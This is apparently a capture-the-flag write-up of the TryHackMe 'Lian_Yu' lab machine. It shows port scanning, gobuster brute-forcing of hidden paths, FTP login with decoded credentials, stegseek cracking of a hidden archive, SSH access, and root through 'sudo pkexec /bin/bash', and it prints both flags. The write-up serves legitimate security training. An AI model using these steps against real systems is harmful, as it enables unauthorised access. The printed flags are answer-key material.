# lianyu

```sh
export IP=10.10.119.227
```

## Enumeration

### rustscan + nmap

```sh
rustscan -a $IP -- -A -sC -sV -T4
```

```
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'

...

Open 10.10.119.227:21
Open 10.10.119.227:22
Open 10.10.119.227:80
Open 10.10.119.227:111
Open 10.10.119.227:54122

...

PORT      STATE SERVICE REASON  VERSION
21/tcp    open  ftp     syn-ack vsftpd 3.0.2
22/tcp    open  ssh     syn-ack OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
|   1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e:de:87:f4 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAOZ67Cx0AtDwHfVa7iZw6O6htGa3GHwfRFSIUYW64PLpGRAdQ734COrod9T+pyjAdKscqLbUAM7xhSFpHFFGM7NuOwV+d35X8CTUM882eJX+t3vhEg9d7ckCzNuPnQSpeUpLuistGpaP0HqWTYjEncvDC0XMYByf7gbqWWU2pe9HAAAAFQDWZIJ944u1Lf3PqYCVsW48Gm9qCQAAAIBfWJeKF4FWRqZzPzquCMl6Zs/y8od6NhVfJyWfi8APYVzR0FR05YCdS2OY4C54/tI5s6i4Tfpah2k+fnkLzX74fONcAEqseZDOffn5bxS+nJtCWpahpMdkDzz692P6ffDjlSDLNAPn0mrJuUxBFw52Rv+hNBPR7SKclKOiZ86HnQAAAIAfWtiPHue0Q0J7pZbLeO8wZ9XNoxgSEPSNeTNixRorlfZBdclDDJcNfYkLXyvQEKq08S1rZ6eTqeWOD4zGLq9i1A+HxIfuxwoYp0zPodj3Hz0WwsIB2UzpyO4O0HiU6rvQbWnKmUaH2HbGtqJhYuPr76XxZtwK4qAeFKwyo87kzg==
|   2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDRbgwcqyXJ24ulmT32kAKmPww+oXR6ZxoLeKrtdmyoRfhPTpCXdocoj0SqjsETI8H0pR0OVDQDMP6lnrL8zj2u1yFdp5/bDtgOnzfd+70Rul+G7Ch0uzextmZh7756/VrqKn+rdEVWTqqRkoUmI0T4eWxrOdN2vzERcvobqKP7BDUm/YiietIEK4VmRM84k9ebCyP67d7PSRCGVHS218Z56Z+EfuCAfvMe0hxtrbHlb+VYr1ACjUmGIPHyNeDf2430rgu5KdoeVrykrbn8J64c5wRZST7IHWoygv5j9ini+VzDhXal1H7l/HkQJKw9NSUJXOtLjWKlU4l+/xEkXPxZ
|   256 a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPfrP3xY5XGfIk2+e/xpHMTfLRyEjlDPMbA5FLuasDzVbI91sFHWxwY6fRD53n1eRITPYS1J6cBf+QRtxvjnqRg=
|   256 3f:43:76:75:a8:5a:a6:cd:33:b0:66:42:04:91:fe:a0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDexCVa97Otgeg9fCD4RSvrNyB8JhRKfzBrzUMe3E/Fn
80/tcp    open  http    syn-ack Apache httpd
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache
|_http-title: Purgatory
111/tcp   open  rpcbind syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          37270/udp6  status
|   100024  1          44760/tcp6  status
|   100024  1          52854/udp   status
|_  100024  1          54122/tcp   status
54122/tcp open  status  syn-ack 1 (RPC #100024)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### gobuster

```sh
gobuster -u $IP -w /opt/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```
=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.119.227/
[+] Threads      : 10
[+] Wordlist     : /opt/wordlists/dirb/big.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2023/10/04 00:53:16 Starting gobuster
=====================================================
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/island (Status: 301)
/server-status (Status: 403)
=====================================================
2023/10/04 00:58:01 Finished
=====================================================
```

<details>
  <summary>Found /island (301)</summary>
  
```html
<!DOCTYPE html>
<html>
<body>
<style>
 
</style>
<h1> Ohhh Noo, Don't Talk............... </h1>





<p> I wasn't Expecting You at this Moment. I will meet you there </p><!-- go!go!go! -->






<p>You should find a way to <b> Lian_Yu</b> as we are planed. The Code Word is: </p><h2 style="color:white"> vigilante</style></h2>

</body>
</html>
```

- Code word: vigilante

</details>

A hint says that the hidden directory is a 4 digit pin.

Let's generate it with this shell code:

```sh
for i in {0..9999}; do
    printf "%04d\n" "$i"
done > digits.txt
```

And try it on previous directory found:

```sh
gobuster -u http://$IP/island/ -w digits.txt
```

```
=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.119.227/island/
[+] Threads      : 10
[+] Wordlist     : digits.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2023/10/04 01:24:20 Starting gobuster
=====================================================
/2100 (Status: 301)
=====================================================
2023/10/04 01:25:22 Finished
=====================================================
```

Success we found it!

<details>
  <summary>Found /island/2100 (301)</summary>
  
```html
<!DOCTYPE html>
<html>
<body>

<h1 align=center>How Oliver Queen finds his way to Lian_Yu?</h1>


<p align=center >
<iframe width="640" height="480" src="https://www.youtube.com/embed/X8ZiFuW41yY">
</iframe> <p>
<!-- you can avail your .ticket here but how?   -->

</header>
</body>
</html>
```

Following the hint again we found that the .ticket is a expension for a hidden file!

- Extension: .ticket

</details>

Let's use gobuster again now with extension .ticket enabled:

```sh
gobuster -u http://$IP/island/2100 -w /opt/wordlists/dirbuster/directory-list-2.3-medium.txt -x ticket
```

```
=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.119.227/island/2100/
[+] Threads      : 10
[+] Wordlist     : /opt/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : ticket
[+] Timeout      : 10s
=====================================================
2023/10/04 01:28:44 Starting gobuster
=====================================================
/green_arrow.ticket (Status: 200)
=====================================================
```

Found: http://$IP/island/2100/green_arrow.ticket

[ Nice reference to Oliver Queen :) ]


<details>
  <summary>green_arrow.ticket</summary>
  
```

This is just a token to get into Queen's Gambit(Ship)


RTy8yhBQdscX
```

Looks like base64, but actually it's base58.

(Used this https://www.dcode.fr/cipher-identifier to find enconding)

- FTP password: `!#th3h00d`

</details>

Found the ftp password!

## Initial access

### ftp

With the code word found previously we have all we need to login in ftp:

```
$ ftp $IP
Connected to 10.10.119.227.
220 (vsFTPd 3.0.2)
Name (10.10.119.227:z0d1ac): vigilante
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
229 Entering Extended Passive Mode (|||39647|).
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 May 05  2020 .
drwxr-xr-x    4 0        0            4096 May 01  2020 ..
-rw-------    1 1001     1001           44 May 01  2020 .bash_history
-rw-r--r--    1 1001     1001          220 May 01  2020 .bash_logout
-rw-r--r--    1 1001     1001         3515 May 01  2020 .bashrc
-rw-r--r--    1 0        0            2483 May 01  2020 .other_user
-rw-r--r--    1 1001     1001          675 May 01  2020 .profile
-rw-r--r--    1 0        0          511720 May 01  2020 Leave_me_alone.png
-rw-r--r--    1 0        0          549924 May 05  2020 Queen's_Gambit.png
-rw-r--r--    1 0        0          191026 May 01  2020 aa.jpg
226 Directory send OK.
ftp> mget *
mget Leave_me_alone.png [anpqy?]? y
229 Entering Extended Passive Mode (|||36334|).
150 Opening BINARY mode data connection for Leave_me_alone.png (511720 bytes).
100% |***********************************************************|   499 KiB  387.49 KiB/s    00:00 ETA
226 Transfer complete.
511720 bytes received in 00:01 (372.79 KiB/s)
mget Queen's_Gambit.png [anpqy?]? y
229 Entering Extended Passive Mode (|||46444|).
150 Opening BINARY mode data connection for Queen's_Gambit.png (549924 bytes).
100% |***********************************************************|   537 KiB  493.49 KiB/s    00:00 ETA
226 Transfer complete.
549924 bytes received in 00:01 (471.58 KiB/s)
mget aa.jpg [anpqy?]? y
229 Entering Extended Passive Mode (|||7604|).
150 Opening BINARY mode data connection for aa.jpg (191026 bytes).
100% |***********************************************************|   186 KiB  441.55 KiB/s    00:00 ETA
226 Transfer complete.
191026 bytes received in 00:00 (395.29 KiB/s)
ftp> mget .*
mget .bash_history [anpqy?]? y
229 Entering Extended Passive Mode (|||26086|).
150 Opening BINARY mode data connection for .bash_history (44 bytes).
100% |***********************************************************|    44      231.01 KiB/s    00:00 ETA
226 Transfer complete.
44 bytes received in 00:00 (0.87 KiB/s)
mget .bash_logout [anpqy?]? y
229 Entering Extended Passive Mode (|||35279|).
150 Opening BINARY mode data connection for .bash_logout (220 bytes).
100% |***********************************************************|   220      320.18 KiB/s    00:00 ETA
226 Transfer complete.
220 bytes received in 00:00 (4.26 KiB/s)
mget .bashrc [anpqy?]? y
229 Entering Extended Passive Mode (|||33958|).
150 Opening BINARY mode data connection for .bashrc (3515 bytes).
100% |***********************************************************|  3515        0.99 MiB/s    00:00 ETA
226 Transfer complete.
3515 bytes received in 00:00 (65.16 KiB/s)
mget .other_user [anpqy?]? y
229 Entering Extended Passive Mode (|||32821|).
150 Opening BINARY mode data connection for .other_user (2483 bytes).
100% |***********************************************************|  2483      951.64 KiB/s    00:00 ETA
226 Transfer complete.
2483 bytes received in 00:00 (46.00 KiB/s)
mget .profile [anpqy?]? y
229 Entering Extended Passive Mode (|||37780|).
150 Opening BINARY mode data connection for .profile (675 bytes).
100% |***********************************************************|   675        2.46 MiB/s    00:00 ETA
226 Transfer complete.
675 bytes received in 00:00 (13.20 KiB/s)
ftp> bye
221 Goodbye.
```

### File searching

Interesting files:

<details>
  <summary>.bash_history</summary>

```
Sorry I couldn't Help Other user Might help
```

</details>

<details>
  <summary>.other_user</summary>

```
Slade Wilson was 16 years old when he enlisted in the United States Army, having lied about his age. After serving a stint in Korea, he was later assigned to Camp Washington where he had been promoted to the rank of major. In the early 1960s, he met Captain Adeline Kane, who was tasked with training young soldiers in new fighting techniques in anticipation of brewing troubles taking place in Vietnam. Kane was amazed at how skilled Slade was and how quickly he adapted to modern conventions of warfare. She immediately fell in love with him and realized that he was without a doubt the most able-bodied combatant that she had ever encountered. She offered to privately train Slade in guerrilla warfare. In less than a year, Slade mastered every fighting form presented to him and was soon promoted to the rank of lieutenant colonel. Six months later, Adeline and he were married and she became pregnant with their first child. The war in Vietnam began to escalate and Slade was shipped overseas. In the war, his unit massacred a village, an event which sickened him. He was also rescued by SAS member Wintergreen, to whom he would later return the favor.

Chosen for a secret experiment, the Army imbued him with enhanced physical powers in an attempt to create metahuman super-soldiers for the U.S. military. Deathstroke became a mercenary soon after the experiment when he defied orders and rescued his friend Wintergreen, who had been sent on a suicide mission by a commanding officer with a grudge.[7] However, Slade kept this career secret from his family, even though his wife was an expert military combat instructor.

A criminal named the Jackal took his younger son Joseph Wilson hostage to force Slade to divulge the name of a client who had hired him as an assassin. Slade refused, claiming it was against his personal honor code. He attacked and killed the kidnappers at the rendezvous. Unfortunately, Joseph's throat was slashed by one of the criminals before Slade could prevent it, destroying Joseph's vocal cords and rendering him mute.

After taking Joseph to the hospital, Adeline was enraged at his endangerment of her son and tried to kill Slade by shooting him, but only managed to destroy his right eye. Afterwards, his confidence in his physical abilities was such that he made no secret of his impaired vision, marked by his mask which has a black, featureless half covering his lost right eye. Without his mask, Slade wears an eyepatch to cover his eye.

```

</details>

Looking for hidden data...

Found it using [stegseek](https://github.com/RickdeJager/stegseek)

```
$stegseek aa.jpg /opt/wordlists/rockyou.txt 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "password"
[i] Original filename: "ss.zip".
[i] Extracting to "aa.jpg.out".
```

```sh
unzip aa.jpg.out
Archive:  aa.jpg.out
  inflating: passwd.txt              
  inflating: shado
```


<details>
  <summary>passwd.txt</summary>

```
This is your visa to Land on Lian_Yu # Just for Fun ***


a small Note about it


Having spent years on the island, Oliver learned how to be resourceful and 
set booby traps all over the island in the common event he ran into dangerous
people. The island is also home to many animals, including pheasants,
wild pigs and wolves.




```

</details>

<details>
  <summary>shado</summary>

```
M3tahuman
```

</details>

Found the ssh password!

### ssh

Thanks to the `.other_user` file we assume that the username is slade:

```
$ ssh slade@10.10.119.227
slade@10.10.119.227's password: 
			      Way To SSH...
			  Loading.........Done.. 
		   Connecting To Lian_Yu  Happy Hacking

██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗██████╗ 
██║    ██║██╔════╝██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝╚════██╗
██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║██╔████╔██║█████╗   █████╔╝
██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝  ██╔═══╝ 
╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗███████╗
 ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝╚══════╝


	██╗     ██╗ █████╗ ███╗   ██╗     ██╗   ██╗██╗   ██╗
	██║     ██║██╔══██╗████╗  ██║     ╚██╗ ██╔╝██║   ██║
	██║     ██║███████║██╔██╗ ██║      ╚████╔╝ ██║   ██║
	██║     ██║██╔══██║██║╚██╗██║       ╚██╔╝  ██║   ██║
	███████╗██║██║  ██║██║ ╚████║███████╗██║   ╚██████╔╝
	╚══════╝╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝    ╚═════╝  #

slade@LianYu:~$
```

#### User flag

<details>
  <summary>user.txt</summary>

```
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
			--Felicity Smoak
```

</details>

#### Root flag

```
cat .Important 
What are you  Looking for ?

root Privileges ? 

try to find Secret_Mission
```

Okay

```
find / -name Secret_Mission 2>/dev/null
```

Found it: `/usr/src/Secret_Mission`

<details>
  <summary>Secret_Mission</summary>

```
Why do we need Mirakuru? 


Enhancements to strength, senses, stamina and endurance in particular were raised beyond human capability, while reflexes and agility where raised only to the peak of human capability. Primarily, the serum resulted in the subject developing an accelerated healing factor that allowed them to recover completely from the most crippling, debilitating, and grievous of wounds, so long as any injuries were not immediately fatal or if an entire body part or organ were not lost; for example, the drug didn't keep Isabel Rochev from dying when her neck was snapped by Nyssa. Slade Wilson was also unable to regenerate his eye after it was pierced with an arrow, however this may be due to the arrow being left in his eye while the Mirakuru in his system became dormant.





super powers do you need just go find it.
```

Anyway let's go find some sudo powers :)

</details>

We can run pkexec with sudo:

```
User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec
```

```
$ sudo pkexec /bin/bash
# id
uid=0(root) gid=0(root) groups=0(root)
```

<details>
  <summary>root.txt</summary>

```
                          Mission accomplished



You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE. 



THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
									      --DEATHSTROKE

Let me know your comments about this machine :)
I will be available @twitter @User6825


```

</details>